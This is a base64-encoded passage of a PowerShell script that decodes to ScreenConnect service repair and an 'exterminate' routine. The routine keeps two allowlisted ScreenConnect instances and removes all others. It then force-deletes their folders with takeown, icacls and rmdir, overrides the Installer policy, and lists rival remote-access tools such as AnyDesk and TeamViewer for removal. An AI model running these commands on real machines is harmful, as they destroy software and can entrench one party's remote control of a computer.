IC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVy
biAneWVzJyB9CiAgICAgICAgfQogICAgfQogICAgcmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVw
YWlyLVNDU2VydmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBk
ZWxldGVkIFNDIHNlcnZpY2UgZW50cnkgYnkgcmVwYWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1
Y3QuCiAgICAjIG1zaWV4ZWMgL2ZhIHtHVUlEfSByZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBO
T1QgcnVuIHRoZSBTQy1mYW1pbHkKICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhl
ciBpbnN0YW5jZXMgYXJlIHVudG91Y2hlZC4KICAgICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50
LWJ1dC1TVE9QUEVEIHNlcnZpY2VzIChyZXBhaXIgcmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRo
ZW4gc3RhcnQpLiBPbmx5IGEgUnVubmluZyBzZXJ2aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4K
ICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRzdmMgPSBHZXQtU2Vy
dmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRz
dmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcn
IH0KICAgICRndWlkID0gJG51bGwKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0
YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJv
cGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlO
YW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXku
UFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7ICRndWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJl
YWsgfQogICAgICAgIH0KICAgICAgICBpZiAoJGd1aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYg
KC1ub3QgJGd1aWQpIHsgcmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRl
bGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIn
IC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xN
XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJs
ZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2lu
LVBhdGggJFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyIKICAgICRwID0gU3Rh
cnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvZmEgJGd1aWQgL3FuIC9ub3Jl
c3RhcnQgL0wqdiBgIiRsb2dgIiIgLVdhaXQgLVBhc3NUaHJ1CiAgICBTdGFydC1TbGVlcCAtU2Vj
b25kcyA4CiAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0
LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFy
dC1TbGVlcCAtU2Vjb25kcyA0CiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMg
LWVxICdSdW5uaW5nJykgeyByZXR1cm4gInN2Yy1yZXN0b3JlZCBleGl0PSQoJHAuRXhpdENvZGUp
IiB9CiAgICBpZiAoJHN2YykgeyByZXR1cm4gInN2Yy1zdGlsbC1zdG9wcGVkIGV4aXQ9JCgkcC5F
eGl0Q29kZSkiIH0KICAgIHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRD
b2RlKSIKfQoKZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsKICAgICMgTDc6IHRydWUgcmVt
b3ZhbC4gQ29ycmVjdCBXT1c2NDMyTm9kZSBoaXZlICsgbXNpZXhlYyArIFVuaW5zdGFsbFN0cmlu
ZwogICAgIyBmYWxsYmFjayArIGZvcmNlIGRpciBudWtlLiBLZWVwIG9ubHkgdGhlIHR3byBhbGxv
d2xpc3RlZCBmaW5nZXJwcmludHMuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRl
cm1pbmF0ZS5sb2cnCiAgICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBk
NDUzNDI3JykKICAgICRuID0gQHsgc3ZjID0gMDsgcHJvYyA9IDA7IGRpciA9IDA7IHByb2R1Y3Qg
PSAwOyBybW0gPSAwOyBmYWlsID0gMCB9CiAgICBmdW5jdGlvbiBMb2coW3N0cmluZ10kbSkgewog
ICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRk
IEhIOm1tOnNzJyksICRtCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZh
bHVlICRsaW5lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgV3JpdGUtT3V0
cHV0ICRsaW5lCiAgICB9CiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgewogICAg
ICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIGZvcmVhY2ggKCRrIGlu
ICRrZWVwKSB7IGlmICgkcyAtbGlrZSAiKiRrKiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAg
IHJldHVybiAkZmFsc2UKICAgIH0KICAgIGZ1bmN0aW9uIEZvcmNlLVJlbW92ZURpcihbc3RyaW5n
XSRkKSB7CiAgICAgICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBh
dGggJGQpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1By
b2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1P
YmplY3QgeyAkXy5FeGVjdXRhYmxlUGF0aCAtYW5kICRfLkV4ZWN1dGFibGVQYXRoLlN0YXJ0c1dp
dGgoJGQsIFtTdHJpbmdDb21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpIH0gfAogICAgICAg
ICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9CiAgICAgICAgJiB0YWtlb3duLmV4ZSAv
RiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3Jh
bnQgJypTLTEtNS0zMi01NDQ6RicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBp
Y2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6RicgL1QgL0MgL1EgMj4mMSB8IE91
dC1OdWxsCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlmIChUZXN0LVBhdGggLUxp
dGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAv
cyAvZCBgIiRkXCouKmAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgY21kLmV4ZSAvYyAi
cm1kaXIgL3MgL3EgYCIkZGAiIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICB9CiAgICAgICAgaWYg
KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJGVtcHR5ID0gSm9pbi1Q
YXRoICRlbnY6VEVNUCAoIm93bl9lbXB0eV8iICsgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmco
J04nKSkKICAgICAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkZW1w
dHkgLUZvcmNlIHwgT3V0LU51bGwKICAgICAgICAgICAgJiByb2JvY29weS5leGUgJGVtcHR5ICRk
IC9NSVIgL1I6MCAvVzowIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAt
TGl0ZXJhbFBhdGggJGVtcHR5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgfQogICAgICAgIHJldHVybiAtbm90
IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKQogICAgfQogICAgZnVuY3Rpb24gVW5pbnN0YWxs
LVByb2R1Y3RLZXkoJGtleSkgewogICAgICAgICRndWlkID0gJGtleS5QU0NoaWxkTmFtZQogICAg
ICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQogICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lCiAgICAgICAgaWYg
KCRndWlkIC1saWtlICd7Kn0nKSB7CiAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2ll
eGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVh
bGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAg
ICAgIExvZyAicHJvZHVjdF9tc2lleGVjIFskZG5dIGd1aWQ9JGd1aWQgZXhpdD0kKCRwLkV4aXRD
b2RlKSIKICAgICAgICAgICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEw
KSB7IHJldHVybiAkdHJ1ZSB9CiAgICAgICAgfQogICAgICAgICR1cyA9ICRwcm9wLlVuaW5zdGFs
bFN0cmluZwogICAgICAgIGlmICgkdXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAg
ICAgIGlmICgkdXMgLW1hdGNoICcoP2kpbXNpZXhlYycpIHsKICAgICAgICAgICAgICAgICAgICAk
YXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykKICAg
ICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1hdGNoICcvcW4nKSB7ICRhcmdzID0gIiRh
cmdzIC9xbiAvbm9yZXN0YXJ0IiB9CiAgICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9j
ZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgJGFyZ3MgLVdhaXQgLVBhc3NUaHJ1IC1XaW5k
b3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxs
c3RyaW5nX21zaSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAgICAg
IHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApCiAgICAgICAgICAg
ICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBjbWQu
ZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0IC1Q
YXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9k
dWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAg
ICAgICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1lcSAwKQogICAgICAgICAgICAgICAg
fQogICAgICAgICAgICB9IGNhdGNoIHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlM
IFskZG5dICRfIiB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KCiAgICBM
b2cgJ2V4dGVybWluYXRlX2VuZ2luZV9MN19iZWdpbicKCiAgICAjIDEuIGZvcmVpZ24gU0MgcHJv
ZHVjdHMgZnJvbSBCT1RIIGNvcnJlY3QgQVJQIGhpdmVzCiAgICAkc2VlbiA9IEB7fQogICAgZm9y
ZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgIGlmICgtbm90
IChUZXN0LVBhdGggJHJvb3QpKSB7IExvZyAiaGl2ZV9taXNzaW5nICRyb290IjsgY29udGludWUg
fQogICAgICAgIExvZyAiaGl2ZV9zY2FuICRyb290IgogICAgICAgIEdldC1DaGlsZEl0ZW0gJHJv
b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAg
ICAgICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUKICAgICAgICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAg
ICAgICAgaWYgKC1ub3QgJGRuKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkZG4gLW5vdG1h
dGNoICcoP2kpU2NyZWVuQ29ubmVjdFxzK0NsaWVudFxzKlwoKFswLTlBLUZhLWZdezE2fSlcKScp
IHsgcmV0dXJuIH0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpCiAgICAg
ICAgICAgIGlmICgkZnAgLWluICRrZWVwKSB7IHJldHVybiB9CiAgICAgICAgICAgIGlmICgkc2Vl
bi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsgcmV0dXJuIH0KICAgICAgICAgICAgJHNl
ZW5bJF8uUFNDaGlsZE5hbWVdID0gJHRydWUKICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9k
dWN0S2V5ICRfKSB7ICRuLnByb2R1Y3QrKyB9IGVsc2UgeyAkbi5mYWlsKys7IExvZyAicHJvZHVj
dF9SRU1PVkVfRkFJTEVEIFskZG5dIiB9CiAgICAgICAgfQogICAgfQoKICAgICMgMi4gZm9yZWln
biBTQyBzZXJ2aWNlcwogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUgfCBXaGVyZS1PYmplY3QgeyAkXy5OYW1lIC1saWtlICdTY3Jl
ZW5Db25uZWN0IENsaWVudConIH0pKSB7CiAgICAgICAgaWYgKElzLUtlZXBlciAkc3ZjLk5hbWUp
IHsgY29udGludWUgfQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8
IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA2MDAKICAgICAgICAm
IHNjLmV4ZSBkZWxldGUgIiQoJHN2Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJG4u
c3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIgogICAgfQoKICAgICMgMy4gZm9y
ZWlnbiBTQyBwcm9jZXNzZXMgKGtpbGwgZXZlbiB3aGVuIEV4ZWN1dGFibGVQYXRoIGlzIG51bGwp
CiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1Nj
cmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9i
amVjdCB7CiAgICAgICAgJGV4ZSA9ICRfLkV4ZWN1dGFibGVQYXRoCiAgICAgICAgJGNtZCA9ICRf
LkNvbW1hbmRMaW5lCiAgICAgICAgJGtlZXBlciA9IChJcy1LZWVwZXIgJGV4ZSkgLW9yIChJcy1L
ZWVwZXIgJGNtZCkKICAgICAgICBpZiAoLW5vdCAka2VlcGVyKSB7CiAgICAgICAgICAgIFN0b3At
UHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZQogICAgICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19raWxsZWQgcGlkPSQoJF8uUHJv
Y2Vzc0lkKSBleGU9JGV4ZSIKICAgICAgICB9CiAgICB9CgogICAgIyA0LiBmb3JlaWduIFNDIGlu
c3RhbGwgZGlycyAoUEYgKyBQRjg2KQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgkZW52OlByb2dy
YW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9KSkgewogICAgICAgIGlmICgtbm90ICRi
YXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0KICAgICAgICBHZXQt
Q2hpbGRJdGVtIC1MaXRlcmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUg
LWxpa2UgJ1NjcmVlbkNvbm5lY3QqJyB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAg
ICAgJGQgPSAkXy5GdWxsTmFtZQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyBy
ZXR1cm4gfQogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIr
KzsgTG9nICJkaXJfcmVtb3ZlZCAkZCIgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwr
KzsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9CiAgICB9CgogICAg
IyA1LiBkaXNhbGxvd2VkIFJNTSB0b29scwogICAgJHJtbSA9IEAoCiAgICAgICAgQHsgVGFnPSdB
bnlEZXNrJzsgICAgIFN2Yz1AKCdBbnlEZXNrJyk7IFByb2M9QCgnQW55RGVzaycpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXEFueURlc2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW55
RGVzayIsIiRlbnY6UHJvZ3JhbURhdGFcQW55RGVzayIpOyBQcm9kPUAoJ0FueURlc2sqJykgfQog
ICAgICAgIEB7IFRhZz0nVGVhbVZpZXdlcic7ICBTdmM9QCgnVGVhbVZpZXdlcionKTsgUHJvYz1A
KCdUZWFtVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRlYW1WaWV3ZXIiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdlciIpOyBQcm9kPUAoJ1RlYW1WaWV3ZXIq
JykgfQogICAgICAgIEB7IFRhZz0nTWVzaEFnZW50JzsgICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01l
c2hBZ2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJh
bConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicpIH0KICAgICAg
ICBAeyBUYWc9J1NwbGFzaHRvcCc7ICAgU3ZjPUAoJ1NwbGFzaHRvcConLCdTUlNlcnZpY2UnLCdT
U1VTZXJ2aWNlJyk7IFByb2M9QCgnU3BsYXNodG9wKicsJ3N0cndpbmNsdConLCdTUk1hbmFnZXIq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3BsYXNodG9wIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFNwbGFzaHRvcCIpOyBQcm9kPUAoJ1NwbGFzaHRvcConKSB9CiAgICAgICAgQHsg
VGFnPSdMb2dNZUluJzsgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMnLCdMTUlp
Z25pdGlvbicpOyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2ZXIqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsgVGFnPSdHb1Rv
JzsgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicp
OyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConKSB9CiAg
ICAgICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7IFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicp
OyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIp
OyBQcm9kPUAoJ0Nvbm5lY3RXaXNlKicsJ0xhYlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nQXRl
cmEnOyAgICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAoJ0F0ZXJhQWdlbnQqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQVRFUkEgTmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cQVRFUkEgTmV0d29ya3MiKTsgUHJvZD1AKCdBdGVyYSonKSB9CiAgICAgICAgQHsg
VGFnPSdOaW5qYVJNTSc7ICAgIFN2Yz1AKCdOaW5qYVJNTUFnZW50JywnbmluamFybW0qJyk7IFBy
b2M9QCgnTmluamFSTU1BZ2VudConLCduaW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xOaW5qYVJNTUFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1NQWdl
bnQiLCIkZW52OlByb2dyYW1EYXRhXE5pbmphUk1NQWdlbnQiKTsgUHJvZD1AKCdOaW5qYVJNTSon
KSB9CiAgICAgICAgQHsgVGFnPSdEYXR0byc7ICAgICAgIFN2Yz1AKCdDZW50cmFTdGFnZScsJ0Nh
Z1NlcnZpY2UnKTsgUHJvYz1AKCdDZW50cmFTdGFnZSonLCdEYXR0b1JNTSonKTsgRGlycz1AKCIk
ZW52OlByb2dyYW1GaWxlc1xDZW50cmFTdGFnZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxD
ZW50cmFTdGFnZSIpOyBQcm9kPUAoJ0RhdHRvKicsJ0NlbnRyYVN0YWdlKicpIH0KICAgICAgICBA
eyBUYWc9J1J1c3REZXNrJzsgICAgU3ZjPUAoJ1J1c3REZXNrJywncnVzdGRlc2sqJyk7IFByb2M9
QCgncnVzdGRlc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUnVzdERlc2siLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cUnVzdERlc2siKTsgUHJvZD1AKCdSdXN0RGVzayonKSB9CiAg
ICAgICAgQHsgVGFnPSdTdXByZW1vJzsgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9jPUAoJ1N1
cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAgICAgICAgQHsg
VGFnPSdEV1NlcnZpY2UnOyAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdk
d2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9k
PUAoJ0RXQWdlbnQqJykgfQogICAgICAgIEB7IFRhZz0nWm9ob0Fzc2lzdCc7ICBTdmM9QCgnWm9o
b0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0KicsJ1pvaG9VUlNC
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0aW5nIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgnWm9obyBBc3Npc3QqJykgfQogICAg
ICAgIEB7IFRhZz0nUmVtb3RlUEMnOyAgICBTdmM9QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgnUmVt
b3RlUEMqJywnUlBDU3VpdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVtb3RlUEMi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVtb3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQQyon
KSB9CiAgICAgICAgQHsgVGFnPSdTeW5jcm8nOyAgICAgIFN2Yz1AKCdTeW5jcm8qJywnS2FidXRv
KicpOyBQcm9jPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcUmVwYWlyVGVjaCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZXBhaXJUZWNoIiwiJGVu
djpQcm9ncmFtRmlsZXNcU3luY3JvIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN5bmNybyIp
OyBQcm9kPUAoJ1N5bmNybyonLCdLYWJ1dG8qJywnUmVwYWlyVGVjaConKSB9CiAgICAgICAgQHsg
VGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJyk7IFByb2M9
QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
TWFuYWdlRW5naW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1hbmFnZUVuZ2luZSIpOyBQ
cm9kPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicpIH0KICAgICAgICBAeyBUYWc9J0thc2V5YSc7
ICAgICAgU3ZjPUAoJ0thc2V5YSonLCdBZ2VudE1vbicpOyBQcm9jPUAoJ0FnZW50TW9uKicsJ0th
c2V5YSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cS2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhKicpIH0KICAgICAgICBAeyBUYWc9
